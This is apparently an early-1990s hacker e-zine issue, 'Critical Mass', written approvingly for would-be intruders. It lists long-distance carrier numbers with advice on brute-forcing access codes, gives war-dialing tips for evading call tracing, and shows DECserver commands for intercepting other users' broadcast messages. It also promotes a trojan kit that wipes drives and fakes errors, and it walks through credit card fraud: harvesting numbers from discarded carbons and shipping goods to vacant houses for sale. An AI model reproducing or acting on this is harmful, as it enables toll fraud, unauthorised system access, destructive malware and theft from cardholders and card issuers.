         Oh, the things to talk about and the things to hack. There are so
many, yet so little time. The things this text could bring up. The potental.
I love it. Here's something intresting, I here that a few hackers in the 
Atlanta area just got the 'IBM Home Destruction Kit v1.4', and there enjoying
it very much. This is good, and be watching out for version 2.0. As you read
this, the 'SC/HA Hacker ToolBox v3.0', should be out. Get it today. Lately,
my big thing has been LD carriers. What great little toys the fone company
offers hackers. Tonight, I was just reading the this Anarchist newletter
(I got it off of The Reactor BBS (904)878-1736), or ATI_#50, in which they
where talking about LD carriers. After reading the artical, which did have
very good info, they went into talking about using other peoples accounts
on these and how you could get caught. I like the articles they write, but yet
I beg to differ. Considering most carriers are wats lines, that blows that 
theroy to hell if you ask me. Still if you get the chance, do get it. Also 
get ANY newsletters from.........

TAPP
2600

         These are top of the line hack stuff here. To get more info on them,
download ATI_#50. Any rate, I've been hack'in on these lately, cause I've
been feeling a little unsure about a system and about hacking it direct, so
instead of finding a in/out modem that will support it, I'm using LD carriers.
If you ask me they are easy to hack and VERY useful. They tell you the majority
of the time when you enter a wrong account, and sence your using a touch tone
fone, you only have 0-9 to worry about, plus the uses of the # and * key. For
more info just download ATI_#50. Anyrate, here are a few LD carriers........


(800)547-1784       6 digit code
(800)882-2255       ? ????? ????
(800)437-7010       8 digit code
(800)325-1337       6 digit code
(800)327-9488       6 digit code

          Hell, you can get carriers out of the fone book. You don't even need
a computer to hack'em! It can help though. This is the best way to hack them
by computer that I know of. Set you system up to try codes then a fone number 
you know that has a carrier. If the code is invalid, your NOT going to get a 
carrier right? If it is, you got a account! The SC/HA ToolBox Hacker will
do this for you, so give it a shot!

          Also, I've been hacking on a 'Centel Packet', any information that 
you know about these network systems, please e-mail me at 'Warriers Retreat'.
(904)422-3606 or 'The Reactor BBS'(904)878-1736.



          As I sit here at my terminal, I'm listing to U.S forces fight a 
'war' as of this date. In case your wondering I'm refering to the Kuwait
'leberation'. Now I know what your thinking, what does this have to do with 
hacking. While listing to the radio, I decided to do a wargame in the 224 area
prefix, when my wargame dialer was interrupted by the fone ringing. I picked
up to have a lady ask if I had just called her house. I said 'Ya, I sure did,
you see I was using my computer to call a friend and I dialed the wrong number
, sorry'. She stated that 'Oh, its alright, but its rude to hang up on people 
like that, tell them you got the worng number.'. I said 'sorry, bye'. As you
may know, the Centel offers call tracing. Its neat for them, but not for us 
hackers. When wargaming, you can usually get away wih what I just did with 
some old lady. This gave me a few tips that I thought I would pass on to less
experiance hackers. 

1.  Dial about 100 to 200 Max. Never more. The fone company starts to think 
    after a while, but you have nothing to worry about as long as you stay in
    that range. 40 to 60 numbers max on WATS lines. The fone company will 
    really start to think if you dial 1000 WATS lines. Think about it.
2.  Keep you wargaming to a minimum. Im bad about this rule. 
3.  When caught by someone like above, don't worry, just play it off. If you
    do your wargaming at night, you stand less of a chance that call tracing 
    will be used. People are tired. Also it cost four bucks per trace. 
4.  Once you have a list of good systems you would like to hack, keep it at
    that. Also, find other people that wargame and exchange numbers. This 
    cuts back on wargaming and keeps you both in good shape. 

         Remember these rules! 

    Computer hackers are a dying breed in our area, so if you truely hack, 
be proud but careful. 

                                    ---==<Beaver>==---


P.S. - Heres a funny note. A friend of mine left his wardialer running with 
       no end to dialing and dialed over 2000 numbers. His line was cut and 
       he had to call the operator and get it turned back on. Its not really
       against the law to wargame, but in a way it is considered harrassment
       , so in a way it is. I won't mention how it was, but it was funny.

P.S.S- In this issue, there WAS going to be a artical on cracking commie 
       software by the Shadow, but SOMEBODY got to involved in another project
       and hasn't finnished it yet. Look for it in CM#4

   Ok guys, here it is, the finnal part to hacking DEC servers! This is 
the last of the info about them, except maybe for a little tidbits of info
here and there. First off, It would be wise to read parts I, II, and III. 
Those are in issues CM#1, CM#2, and of course this one. Lets kill the small 
talk and get on with it!


   Ok, we all know how to broadcast messages from port to port right? Well I
hope so, anyway, I bet that you thought that broadcast was a pretty secure
method of sending messages, that is that another port won't recieve messages
that you send to a different port. Well, don't think this, they CAN be recieved
so be careful. Heres how YOU can intercept messages on a privleged account.
First, set up a service. Fake that is. So type the following........

set service (service name)

  This will create a service, but in its current state, you can't connect to
it. So we must enable the service for all or certain ports, like thus.....

set service (service name) port (port number)

  Now you can connect to it. You may want to make a identifier like thus......

set service (service name) ident "(identifier here)"

  This makes it look nice and neat. Now if you connect to this service you
will note that nothing happens, BUT if someone sends a message, you will
recieve it, because as far as we can figure, your looking into message buffer.
You will get none of the 'From port' such and such, but just the message. No
matter where it comes from. Pretty neat huh?


  As for the decoy Idea, we have yet to find a reliable way to set one up. When
we figure out how the maintenance password system works we can probably use a
compiler or interpreter to create one. Till then....... Well, it looks like 
part III is a little short so sorry, but all the info you got in the past 
parts should be more than enough to keep you very busy.

  Before we end, I would like to thank a few DECserver hackers who helped with
hacking and ideas about this type of system......... Namely............

Shadow, The Nut-Kracker, Abigal, Gator off of UFnet, Mentalist, and many others.

Chow..............

Well, here's part III!!!!!! So far we have talked about the following.......

Trojans.....
-------------

Destroying disks on all drives, including drive C:
Creating Fales Keyboard Errors
Creating Faler Disk Errors
Simulating System Crashes
Creating Trojans in TXT files by remapping key thur the ANSI driver
Etc, Etc

Viruses.....
-------------

Creating a EXE to COM infector logical virus in basic.
Creating a EXE to EXE infector logical virus in basic.
Creating a Batch file virus
Etc, Etc


           Now the trojan section goes pretty deep, but the virus section is 
still shallow. So this is a 500 byte code of a overwritting TRUE virus. It 
comes with remarks, but they can be taken out. Thats all there will be for 
part III, cause the code is VERY long........

         I'm not very into this type of stuff, or at least for the last few
years, but it is amazing how easy credit card fraud is. For about 3 to 4
years, I did do the following that I am about to mention and was never caught.
I must warn you the read that never the less this is a very risky game. 
Actually, it is far from a game, but is actually very easy to get away with.
If you must use the information given, please make it something worth while.
Don't use credit card fraud for a neat game you saw in 'Compute' magazine,
but rather something you need. I must also note that when you do this, 90%
of the time, the guy or girl you ripped off never has to pay for the goods
you got but rather the card company that you used. Here we go............


          To preform credit card fraud you need no computer, just a few 
magazines and a card number. Here is the way we use to run things when I 
did it step by step.

           All you need is a credit card number, experation date, and the 
name of the credit card holder. In case your wondering where this information
can be found, its all around you every day. If you have a very photographic
memory, you can obtain all you need at a store, but like most, you probably
can't memorize 16 to 13 digits, the card holders name, and the experation 
date. In this case, you can usually goto a store that is closed and dig though
the trash late at night. In the trash you should find 'carbons', or the 
transfering screen. These are black and when pressed upon tranfer all charaters
to another piece of paper. For example, if you take a carbon and put it over
a piece of paper and write your name on the carbon, it will also be written 

on the piece of paper as well as the carbon. In this case it goes paper-carbon
-paper, so that a copy goes to the customer and a compy to the store and the
carbon is thrown away. When you dig through the trash, you find the carbons and
when held backwards in the light, you can see all the information you need to 
preform credit card fraud. On the carbon, as said before, you will see a 16
to 13 digit number. This is there credit card number. If it is not 13 to 16 
digits, something is wrong, so don't use it. Here are the two most popular 
formats. 

4XXX-XXXX-XXXX-XXXX
5XXX-XXXX-XXXX-XXXX

       Theses are you basic 16 digit formats. The 'X's signify other numbers.
Whats so important about the '4' and '5' are that they tell what type of card
they are. For instance, a credit card that start with '4' is a VISA card, and
a credit card that starts with '5' is a MASTERCARD. All cards run by this 
format. For example, I think cards that start with '3' are DISCOVER cards, but
at this point, because its been so long, I can't remember. But that is what 
tells each card apart. Remember this, this is important information. Just
remember, you must AT LEAST have the card holders name, experation date and
card number. Sometimes you need this and there address and phone number, but
sometimes you can get by without them. Try to get all the information you can
get on them, the more you have the more it helps. 

          The next step we took was simply looking in magazines and finding
things we wanted and needed. We would write down the price and the phone 
numbers. We DID NOT CALL THEM THEN, but later. Just keep reading you'll see
why.

          After this, we found a empty house that was for sale and we knew 
would be open for at least a week. We would look in the 'home buyers guide'
and check out houses. When we found one, we would copy the address and the 
next phase would take place.

          This phase consisted of calling the places that we wanted to order
stuff from and ordering UPS. Early on in our credit card scams, we tried
sending it US mail, but you will never get it. The reason it works with UPS
is because they leave it on the door step if it is pre-paid for, which in this
case it is. NOTE: When the orders where placed, we would send the stuff too
the house for sale (we nobdy lived), this is where the trick and the risk
comes in.

           In about a week, the stuff we ordered would show up at the door
step of the house we order it from. We would check at the house three days
after we had order them ever day. The risk is when you pick up the goods. 
Actually, at the worst, the card holder can only find out a week after it 
happened, because the billing lags behind the order, so actually the risk is 
slim, but there is still a risk. We would simply go there at night, scope out
the area and grab the stuff. As I said, the risk is not very much, but in 
my opinion, there is still a risk involved, bu thtat is only in the pick up.


TIPS: When you order the goods, all you should be asked is what you want, 
      the card type (note the top and see way thats important!), experation
      date, you name (the card holders name OF COURSE!), and the address
      (the empty house). When the mail order house asks your social security
      numbers and other stange questions, something fucked up. You don't have
      the correct information. Just simply hang up, also ONLY DO YOU ORDERING
      ON WATS LINE. They can't (or at least have to have tons of time to trace
      , about 5 to 8 hours to be exact) trace, where if you order in you area
      it takes about millisecound.
 
      What you just read is the bare basics of credit card fraud. Its that
      easy! Thats why I don't have or want a credit card, even though they are 
      becoming a standard. 

      Part II will cover the use of merchant numbers and some other advanced
methods of credit card fraud. Chow!

Hello Monsieur Beaver,

I have some suggestions for CM.  Give more details when describing how to do
stuff.  Some of your info was excellent, but at times it was not enough.  Is
there a number where I can reach you voice?



Ok, your right, sometimes the information does go a little far and not
that well explained, but when Im writting, I tend to think that the reader
is a hacker and already knows alot of the stuff, so I get carried away,
assuming that everybody understands the things I leave out. If you have any
questions, drop me a line. Im sorry but I don't give out my fone number to
strangers.
Sorry! Chow!........

       Beaver,
              What new features will the 'IBM Destruction Kit v2.0' have that
version 1.4 doesn't have?


       After writting version 1.4, I relized the versitity as a 'kit' was 
very little, sence it only created just the file you asked for. So all you
could create was a 'drive C destroyer' and not a 'keyboard traping, drive A,
B, and C destroyer' in one shot. With version 2.0, you can do this. Also,
the files where in assembly and adveraged about 20 bytes. Thats pretty short
to be a 'neat game', or what not, so I added in the options of putting in
nop's to waste space to make the file appear longer. Actually, the first part
of the program are all that counts though. I also added a few other features
I think you guys will like. You can get it from 'The Reactor BBS' under the 
name 'grind2.zip' when it comes out!

Hello once again,

I understand about the phone number (not giving it out).  The only problem
is, I don't feel comfortable asking you questions about FIRN on this or any
other BBS.  I don't want people complaining about me on this board.  I would
like to keep a good status with the users and the sysop so I can keep up the
message reading and file getting.  Know what I mean?   I have been trying to
get a priv account on so many things on FIRN, but I can't get one.  I have
been trying every night for the past week (since I read your article).
I have no problem getting on to FIRN and connecting to FAU Ethernet and then
connecting to a service.  The only problems I have arise when username and
password prompts arise.  I am an 18 year old FSU computer science major.
I wish we had different ways to communicate (non-BBS)



    I can be contacted most every night on 'call 202' off of UFnet. If you
can 'hold you horses' I can almost always be reached there, anlong with a 
few other hacker friends of mine. Just do the following.

Call FIRN (488-0650)
Press 'A'
Type 'UFNET'
At the '#' prompt type 'call 202'
Then type 'sho u' (shows users currently online)

If im on you will see the name 'beaver' and to the left of that the port number
To send me a message type: bro por (#) "Msg. here"    


E.G
      bro por 7 "hello beaver how are you"


      Also, I have found when using terminals like 'pc-talk' I can't use 200
either. the only thing I can suggest is to use a ANSI comp. terminal or a 
vt52 or vt100 terminal.

          Well, once again we come to the end of another issue of Critical 
Mass. Here is what you can probably (I stress probably) expect in the next
issue. 

  Hacking UNIX/SUN's and VAX's
  Kracking Commie Software
  The IBM Home Destruction part V 

          And MUCH more, but you'll just have to wait and see. Also, a 
software update. The 'IBM Home Destruction Kit' is being merged with the 

'The SC/HA Hacker Toolbox'. So there will be no version 2.0 of the 'IBM 
Home Destruction Kit'. Heres what 'The SC/HA Hacker ToolBox V3.1' will 
have........

           Online and Offline Trojan Kit with....
                      Drive A,B,C,D kills
                      Simulated Errors
                      ANSI Remapping
                      Simulated Crashes
                      Multiple task trojan creator
                      Much MORE!
           File Tranfer's in.....
                      XModem
                      Ymodem
                      ASC Buffering
           LD Carrier code finer
           Dbase hacker with.....
                      470+ popular passwords
           A 'Fall in' term for those nets

           And about a ton more! Like Terminal Emulations, and other things!


           ALSO: I had tons of question about hacking DECservers so I and
a few other people are going to put together a text file explaining every
detail on the basics of DECservers along with hacking them. I have no idea
when it will be out though........


           Shadow has been working on a simular kit for the Amiga and I here
that another friend of mine is thinking about writting a simular term for the
c64. We'll see. Any rate, happy hack'en and stay away from those modem 
police!


          Thanx To: Pink Floyd (for that UNIX info), Shadow, Abigail, Robo
                    for forwarding mail, My dad again for ideas, and 
                    many others

      No Thanx Too: The usual assholes, you know how you are!
